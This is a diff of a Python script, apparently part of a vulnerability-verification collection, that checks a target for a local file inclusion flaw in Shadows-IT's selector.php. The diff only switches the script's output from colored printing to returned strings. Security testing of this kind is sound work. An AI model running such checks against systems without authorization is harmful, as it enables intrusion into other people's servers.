@@ -8,8 +8,8 @@ description: 文件selector.php中,参数idbase64解码可包含本地文件。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class shadowsit_selector_lfi_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class shadowsit_selector_lfi_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"$DB_site" in req.text:
-                cprint("[+]存在Shadows-IT selector.php 任意文件包含漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在Shadows-IT selector.php 任意文件包含漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = shadowsit_selector_lfi_BaseVerify(sys.argv[1])
     testVuln.run()
